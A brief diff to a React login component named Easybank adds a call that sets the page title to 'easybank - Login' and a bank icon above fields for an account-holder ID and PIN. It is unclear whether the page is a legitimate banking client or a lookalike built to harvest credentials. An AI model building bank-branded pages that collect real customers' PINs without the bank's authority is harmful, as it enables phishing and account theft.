@@ -117,6 +117,7 @@ const Easybank = () => {
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
+  usePageMeta("easybank - Login", easybankIcon);
 
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
